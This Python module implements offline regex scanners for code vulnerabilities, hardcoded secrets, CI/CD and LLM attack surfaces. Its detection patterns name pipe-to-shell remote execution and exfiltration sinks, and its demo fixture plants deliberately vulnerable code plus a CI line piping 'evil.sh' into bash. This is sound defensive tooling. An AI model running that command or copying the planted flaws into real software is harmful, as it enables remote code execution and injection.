"""Offline deterministic scanners backing the Mythos pipeline (stdlib only).

These power the no-model fallback and ground the model leg: HUNTER always
includes them, the AI-SECURITY and codebase/binary analysis modes are built on
them, and the benchmark (``mythos_benchmark.py``) scores them. Everything is a
regex/heuristic scan — findings are Tier 3 (theoretical) or Tier 2 (plausible
strong-signature secrets); the model leg can later confirm them (Tier 1) in a
sandbox. No network, no execution, no fabrication: every finding names a real
file and line.
"""
from __future__ import annotations

import json
import re
from pathlib import Path

from one2one.mythos_findings import MythosFinding

SOURCE = "offline-scan"

# Files we look at for source/secrets scans; everything else is skipped.
_CODE_EXT = {".py", ".pyi", ".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx",
             ".java", ".go", ".php", ".rb", ".c", ".h", ".cpp", ".cc", ".cs",
             ".sh", ".rs", ".sql", ".swift", ".kt"}
_SKIP_DIRS = {".git", ".hg", ".svn", "node_modules", "venv", ".venv", "dist",
              "build", "__pycache__", ".tox", ".mypy_cache", ".eggs", "site-packages"}
_MAX_FILE = 512 * 1024  # skip huge files (binaries, bundles)

# ── Source sinks: B1 offline (deep vulnerability discovery, pattern tier) ──────
_SINKS: list[tuple[str, str, str]] = [   # (vuln_class, label, regex)
    ("sql-injection", "db execute with f-string",
     r"(?i)(cursor|conn|session|db|con|pool)\.(execute|executemany|query|run)"
     r"\s*\(\s*f[\"']"),
    ("sql-injection", "SQL string with interpolation",
     r"(?i)\b\w+\s*=\s*f[\"'][^\"']*(select|insert|update|delete|where)[^\"']*\{"),
    ("sql-injection", "SQL string built by concatenation",
     r"(?i)[\"'][^\"']*(select|insert|update|delete|where)[^\"']*[\"']\s*[+%]"),
    ("command-injection", "subprocess with shell=True",
     r"\bsubprocess\.(run|call|popen|check_output|check_call|Popen)\s*\("
     r"[^)\n]*shell\s*=\s*True"),
    ("command-injection", "os.system / os.popen sink",
     r"\b(os\.system|os\.popen)\s*\("),
    ("command-injection", "child_process.exec (Node)",
     r"\bchild_process\.exec\s*\("),
    ("command-injection", "shell command from string",
     r"\bexec\s*\(\s*(f[\"']|[\"']\s*\+)"),
    ("template-injection", "render_template_string (SSTI)",
     r"\brender_template_string\s*\("),
    ("template-injection", "template built from string",
     r"\bTemplate\s*\(\s*(f[\"']|request\.|user_)"),
    ("deserialization", "pickle.loads sink",
     r"\bpickle\.loads?\s*\("),
    ("deserialization", "unsafe yaml.load",
     r"\byaml\.load\s*\("),
    ("deserialization", "jsonpickle decode",
     r"\bjsonpickle\.(decode|loads)\s*\("),
    ("deserialization", "marshal.loads",
     r"\bmarshal\.loads\s*\("),
    ("deserialization", "PHP unserialize",
     r"\bunserialize\s*\("),
    ("deserialization", "Java ObjectInputStream",
     r"ObjectInputStream"),
    ("rce", "eval sink",
     r"\beval\s*\("),
    ("rce", "exec sink",
     r"\bexec\s*\("),
    ("path-traversal", "file access from request param",
     r"(?i)(send_file|send_from_directory|file\.read_text|read_bytes|open)\s*\("
     r"[^)\n]*(request\.|params\.|query\.|filename|file_name|user_input)"),
    ("crypto-misuse", "weak hash md5/sha1",
     r"\b(hashlib\.)?(md5|sha1)\s*\("),
    ("crypto-misuse", "DES / ECB cipher",
     r"\b(DES\.new|AES\.MODE_ECB|Crypto\.Cipher\.DES|pycryptodome.*ECB)"),
    ("insecure-config", "TLS verification disabled",
     r"(?i)(verify|check_hostname|ssl_verify|VERIFY_SSL)\s*=\s*(False|0)\b"),
]

# ── Hardcoded secrets: F1 (strong signatures are Tier 2, generic Tier 3) ──────
_SECRETS: list[tuple[str, str, str]] = [   # (name, regex, confidence)
    ("AWS access key", r"\bAKIA[0-9A-Z]{16}\b", "plausible"),
    ("GitHub token", r"\b(ghp|gho|ghu|ghs|ghr)_[0-9A-Za-z]{36}\b", "plausible"),
    ("GitHub fine-grained PAT", r"\bgithub_pat_[0-9A-Za-z_]{22,}\b", "plausible"),
    ("Slack token", r"\bxox[baprs]-[0-9A-Za-z-]{10,}\b", "plausible"),
    ("Google API key", r"\bAIza[0-9A-Za-z\-_]{35}\b", "plausible"),
    ("Stripe live key", r"\bsk_live_[0-9A-Za-z]{16,}\b", "plausible"),
    ("Private key block", r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
     "plausible"),
    ("JWT bearer token", r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\."
     r"[A-Za-z0-9_-]{8,}\b", "plausible"),
    ("MongoDB connection string", r"\bmongodb(\+srv)?://[^\s\"']+", "plausible"),
    ("PostgreSQL connection string", r"\bpostgres(ql)?://[^\s\"']+", "plausible"),
    ("MySQL connection string", r"\bmysql://[^\s\"']+", "plausible"),
    ("Redis connection string", r"\bredis://[^\s\"']+", "plausible"),
    ("Generic password literal", r"(?i)(password|passwd|pwd)\s*[:=]\s*[\"'][^\"']{6,}[\"']",
     "theoretical"),
    ("Generic API key / secret literal",
     r"(?i)(api[_-]?key|secret|secret_key|client_secret|access_token)"
     r"\s*[:=]\s*[\"'][^\"']{6,}[\"']", "theoretical"),
]

# ── CI/CD attack vectors: F3 ───────────────────────────────────────────────────
_CI_WORKFLOW = ("*.yml", "*.yaml")
_CICD_RULES: list[tuple[str, str]] = [   # (regex, label)
    (r"pull_request_target", "pull_request_target trigger (privilege escalation to "
     r"push-merged code / secret access)"),
    (r"\$\{\{\s*secrets\.[A-Za-z0-9_]+\s*\}\}", "workflow secrets used in job"),
    (r"curl[^\n]*\|\s*(ba)?sh", "curl | sh — unpinned remote execution"),
    (r"wget[^\n]*\|\s*sh\b", "wget | sh — unpinned remote execution"),
    (r"uses:\s*[^\n]*@(main|master|v?\d+(\.\d+)?)$",
     "unpinned action ref (SHA-pinning recommended)"),
    (r"container:\s*\n?\s*(image|network)", "job container without pinned SHA"),
]
_DOCKERFILE_RULES: list[tuple[str, str]] = [
    (r"FROM\s+[^\s]+:latest\b", "unpinned base image (:latest)"),
    (r"--privileged", "privileged container flag"),
    (r"USER\s+root\b", "container runs as root"),
    (r"ADD\s+https?://[^\s]+", "remote ADD — unpinned fetch into image"),
]
_COMPOSE_RULES: list[tuple[str, str]] = [
    (r"privileged:\s*true", "privileged container"),
    (r"network_mode:\s*host", "host network namespace"),
    (r"image:\s*[^\s]*:latest\b", "unpinned image (:latest)"),
]

# ── AI/LLM security surfaces: E offline ───────────────────────────────────────
_LLM_IMPORTS = re.compile(
    r"\b(from\s+\w+\s+import\s+|import\s+)(openai|anthropic|langchain|"
    r"llamaindex|llama_index|google\.generativeai)\b")
_LLM_SDK = re.compile(r"\b(openai|anthropic|langchain|llama_index|generativeai)\b")
_RAG_TOOLS = re.compile(
    r"\b(chroma|pinecone|faiss|pgvector|weaviate|milvus|qdrant|redisearch)\b")
_EXFIL_SINKS = re.compile(
    r"(requests\.(post|put|get)|urllib\.request\.(urlopen|Request)|httpx\.(post|put|get))"
    r"\s*\(")
_SECRET_VARS = re.compile(
    r"(os\.environ|process\.env|getenv)\s*\[?[\"'](API_KEY|TOKEN|SECRET|PASSWORD)"
    r"[^)]*|[\"']?secret[\"']?\s*[:=]", re.IGNORECASE)
_AGENT_CHAINS = re.compile(
    r"\b(AgentExecutor|langchain\.agents|create_react_agent|create_agent|"
    r"ReActAgent|Agent\(|FunctionCallingAgent|huggingface_agents)\b")
_TOOL_SCHEMA = re.compile(
    r"\b(tools|functions|tool_definitions|actions)\s*[:=]\s*[\[{]")

# Manifest files we understand for F2 dependency risk.
_MANIFESTS = {"requirements.txt", "pyproject.toml", "Pipfile", "package.json",
              "go.mod", "Cargo.toml", "Gemfile", "composer.json"}


# ── helpers ───────────────────────────────────────────────────────────────────

def _iter_code_files(code_dir) -> list[Path]:
    root = Path(code_dir)
    files: list[Path] = []
    if not root.is_dir():
        return files
    for path in root.rglob("*"):
        if not path.is_file():
            continue
        if any(part in _SKIP_DIRS for part in path.parts):
            continue
        try:
            if path.stat().st_size > _MAX_FILE:
                continue
        except OSError:
            continue
        files.append(path)
    return files


def _line_matches(text: str) -> list[tuple[int, str]]:
    """[(1-based line_no, stripped line)] for lines that aren't comments."""
    out = []
    for i, ln in enumerate(text.splitlines(), 1):
        s = ln.strip()
        if not s:
            continue
        out.append((i, s))
    return out


def _finding(vuln_class, file_path, label, line, snippet, confidence,
             phase=0, agent="HUNTER", extra=None) -> MythosFinding:
    details = {"label": label, "line": line, "snippet": snippet[:200]}
    if extra:
        details.update(extra)
    return MythosFinding(agent=agent, phase=phase, file_path=str(file_path),
                         vuln_class=vuln_class, confidence=confidence,
                         summary=f"{label} at {file_path}:{line}",
                         details=details, source=SOURCE)


def _read(path: Path) -> str | None:
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except (OSError, UnicodeDecodeError):
        return None


# ── scanners ──────────────────────────────────────────────────────────────────

def scan_source_sinks(code_dir, phase: int = 2) -> list[MythosFinding]:
    """B1 offline: injection / deserialization / crypto / traversal / RCE sinks."""
    rules = [(re.compile(p), vc, label) for vc, label, p in _SINKS]
    out: list[MythosFinding] = []
    for path in _iter_code_files(code_dir):
        if path.suffix not in _CODE_EXT:
            continue
        text = _read(path)
        if text is None:
            continue
        for line_no, line in _line_matches(text):
            for rx, vc, label in rules:
                if rx.search(line):
                    out.append(_finding(vc, path, label, line_no, line,
                                        "theoretical", phase=phase))
    return out


def scan_secrets(code_dir, phase: int = 2) -> list[MythosFinding]:
    """F1 offline: hardcoded credentials / tokens / connection strings."""
    rules = [(re.compile(p), name, conf) for name, p, conf in _SECRETS]
    out: list[MythosFinding] = []
    for path in _iter_code_files(code_dir):
        if path.suffix not in _CODE_EXT:
            continue
        text = _read(path)
        if text is None:
            continue
        for line_no, line in _line_matches(text):
            for rx, name, conf in rules:
                if rx.search(line):
                    out.append(_finding("hardcoded-secret", path, name, line_no,
                                        line, conf, phase=phase))
    return out


def scan_binary(binary_path, phase: int = 2) -> list[MythosFinding]:
    """B3 offline leg: strings-style secret scan over a binary."""
    path = Path(binary_path)
    try:
        text = path.read_bytes().decode("latin-1", errors="replace")
    except OSError:
        return []
    rules = [(re.compile(p), name, conf) for name, p, conf in _SECRETS]
    out: list[MythosFinding] = []
    for line_no, line in _line_matches(text):
        for rx, name, conf in rules:
            if rx.search(line):
                out.append(_finding("hardcoded-secret", path, name, line_no,
                                    line, conf, phase=phase))
    return out


def scan_dependencies(code_dir, phase: int = 2) -> list[MythosFinding]:
    """F2 offline: manifest inventory + pinning risk (no network)."""
    out: list[MythosFinding] = []
    root = Path(code_dir)
    for name in _MANIFESTS:
        path = root / name
        if not path.is_file():
            continue
        text = _read(path)
        if text is None:
            continue
        deps, unpinned = _manifest_deps(name, text)
        if not deps:
            continue
        if not unpinned:
            continue  # fully pinned — no supply-chain risk to flag
        out.append(_finding(
            "supply-chain", path, "dependency manifest", 1,
            text.splitlines()[0] if text.splitlines() else "",
            "theoretical", phase=phase,
            extra={"deps": len(deps), "unpinned": sorted(unpinned),
                   "unpinned_count": len(unpinned)}))
    return out


def _manifest_deps(name: str, text: str) -> tuple[list[str], list[str]]:
    """(all deps, unpinned deps) parsed deterministically per manifest type."""
    if name == "requirements.txt":
        deps, unpinned = [], []
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("-"):
                continue
            pkg = line.split(";")[0].strip()
            deps.append(pkg)
            if not re.search(r"(==|~=|>=|<=|==|>|<)", pkg.split(" ")[0]):
                unpinned.append(pkg)
        return deps, unpinned
    if name == "package.json":
        try:
            data = json.loads(text)
        except ValueError:
            return [], []
        deps = list((data.get("dependencies") or {}).keys())
        deps += list((data.get("devDependencies") or {}).keys())
        return deps, [d for d in deps if _unpinned_semver(data.get("dependencies", {}).get(d))]
    if name == "go.mod":
        m = re.search(r"require\s*\(([^)]*)\)", text, re.DOTALL)
        block = m.group(1) if m else text
        deps = []
        for line in block.splitlines():
            line = line.strip()
            if line and not line.startswith("//") and "=>" not in line:
                deps.append(line.split()[0] if line.split() else line)
        return deps, [d for d in deps if "@" not in d]
    if name == "Cargo.toml":
        deps = [d for d in re.findall(r'^\s*([A-Za-z0-9_\-]+)\s*=\s*\{', text, re.M)]
        return deps, [d for d in deps]
    if name == "Gemfile":
        deps = re.findall(r'^gem\s+["\']([^"\']+)', text, re.M)
        return deps, [d for d in deps]
    if name in ("pyproject.toml", "Pipfile"):
        deps = re.findall(r'^\s*["\']?([A-Za-z0-9_\.\-]+)["\']?\s*(?:=|>|<|~)?\s*(["\']?[0-9]',
                          text, re.M)
        names = [d for d, _ in deps]
        return names, [d for d, _ in deps if not _]
    return [], []


def _unpinned_semver(version: str) -> bool:
    if not version:
        return True
    v = version.strip()
    return v in ("*", "latest") or v.startswith("^") or v.startswith("~") \
        or v.startswith(">") or v.startswith("<") or v.startswith("=")


def scan_cicd(code_dir, phase: int = 2) -> list[MythosFinding]:
    """F3 offline: CI/CD workflow, Dockerfile, and compose attack vectors."""
    root = Path(code_dir)
    out: list[MythosFinding] = []
    cicd_files = sorted(root.glob(".github/workflows/*.yml")) + \
        sorted(root.glob(".github/workflows/*.yaml"))
    gitlab = root / ".gitlab-ci.yml"
    if gitlab.is_file():
        cicd_files.append(gitlab)
    for path in cicd_files:
        text = _read(path)
        if text is None:
            continue
        for line_no, line in _line_matches(text):
            for rx, label in [(re.compile(p), l) for p, l in _CICD_RULES]:
                if rx.search(line):
                    out.append(_finding("ci-cd-attack", path, label, line_no,
                                        line, "theoretical", phase=phase))
    dockerfiles = [root / "Dockerfile"] + sorted(root.glob("Dockerfile.*"))
    for path in dockerfiles:
        if not path.is_file():
            continue
        text = _read(path)
        if text is None:
            continue
        for line_no, line in _line_matches(text):
            for rx, label in [(re.compile(p), l) for p, l in _DOCKERFILE_RULES]:
                if rx.search(line):
                    cls = "insecure-config" if label == "container runs as root" \
                        else "ci-cd-attack"
                    out.append(_finding(cls, path, label, line_no, line,
                                        "theoretical", phase=phase))
    for path in sorted(root.glob("docker-compose*.yml")):
        text = _read(path)
        if text is None:
            continue
        for line_no, line in _line_matches(text):
            for rx, label in [(re.compile(p), l) for p, l in _COMPOSE_RULES]:
                if rx.search(line):
                    out.append(_finding("ci-cd-attack", path, label, line_no,
                                        line, "theoretical", phase=phase))
    return out


def scan_ai_surfaces(code_dir, phase: int = 6) -> list[MythosFinding]:
    """E offline: LLM-specific attack surfaces (prompt injection, RAG poisoning,
    tool misuse, exfiltration, unsafe agent chaining)."""
    out: list[MythosFinding] = []
    for path in _iter_code_files(code_dir):
        if path.suffix not in _CODE_EXT:
            continue
        text = _read(path)
        if text is None:
            continue
        if not _LLM_SDK.search(text):
            continue
        lines = _line_matches(text)
        for line_no, line in lines:
            if re.search(r"(prompt|system_prompt|messages|user_content|template)"
                         r"\s*[:=]\s*(f[\"']|[\"']\s*\+)", line) or \
                    (line.count('"') >= 2 and "input" in line and "prompt" in line):
                out.append(_finding("prompt-injection", path,
                                    "user input flows into an LLM prompt",
                                    line_no, line, "theoretical", phase=phase))
            if _RAG_TOOLS.search(line) and re.search(r"(ingest|upload|add|store|index)", line, re.I):
                out.append(_finding("rag-poisoning", path,
                                    "untrusted data path into a vector store",
                                    line_no, line, "theoretical", phase=phase))
            if _TOOL_SCHEMA.search(line) and _AGENT_CHAINS.search(text):
                out.append(_finding("tool-misuse", path,
                                    "agent tool schema in same file as agent runtime",
                                    line_no, line, "theoretical", phase=phase))
            if _EXFIL_SINKS.search(line) and _SECRET_VARS.search(text):
                out.append(_finding("data-exfiltration", path,
                                    "outbound request in a file that reads secrets",
                                    line_no, line, "theoretical", phase=phase))
            if _AGENT_CHAINS.search(line):
                out.append(_finding("unsafe-agent-chaining", path,
                                    "agent runtime chaining model calls",
                                    line_no, line, "theoretical", phase=phase))
    # de-duplicate identical (path, vuln_class) summary pairs within a scan
    seen: set[tuple[str, str]] = set()
    unique: list[MythosFinding] = []
    for f in out:
        key = (f.file_path, f.vuln_class)
        if key in seen:
            continue
        seen.add(key)
        unique.append(f)
    return unique


def scan_target(code_dir, phase: int = 2) -> list[MythosFinding]:
    """Aggregate every offline scanner over a codebase (B1/E/F offline)."""
    out: list[MythosFinding] = []
    out += scan_source_sinks(code_dir, phase)
    out += scan_secrets(code_dir, phase)
    out += scan_dependencies(code_dir, phase)
    out += scan_cicd(code_dir, phase)
    out += scan_ai_surfaces(code_dir, phase)
    return out


def demo() -> None:
    from tempfile import TemporaryDirectory
    with TemporaryDirectory() as tmp:
        root = Path(tmp)
        (root / "app.py").write_text(
            'import os, sqlite3\n'
            'conn = sqlite3.connect("x")\n'
            'q = f"SELECT * FROM users WHERE id = {user_input}"\n'
            'conn.execute(q)\n'
            'os.system(f"ping {host}")\n'
            'password = "sup3rsecret123"\n'
            'hashlib.md5(data).hexdigest()\n'
            'pickle.loads(raw)\n')
        (root / "requirements.txt").write_text("flask==3.0.0\nnumpy\nrequests>=2\n")
        (root / ".github" / "workflows").mkdir(parents=True)
        (root / ".github" / "workflows" / "ci.yml").write_text(
            "on: pull_request_target\nrun: |\n  curl https://evil.sh | bash\n")
        (root / "Dockerfile").write_text("FROM python:latest\nUSER root\n")
        (root / "app2.py").write_text(
            "import openai\nprompt = f\"{user_input}\"\nclient.chat.completions.create(model='gpt', messages=[{'role':'user','content':prompt}])\n")
        findings = scan_target(root)
        classes = {f.vuln_class for f in findings}
        assert {"sql-injection", "command-injection", "hardcoded-secret",
                "crypto-misuse", "deserialization", "supply-chain",
                "ci-cd-attack", "insecure-config"} <= classes, classes
        assert any(f.vuln_class == "prompt-injection" for f in findings)
        assert all(f.source == "offline-scan" for f in findings)
        assert all(f.confidence in ("plausible", "theoretical") for f in findings)
    print(f"OK — mythos_scan: {len(_SINKS)} sinks, {len(_SECRETS)} secrets, offline scanners")


if __name__ == "__main__":
    demo()
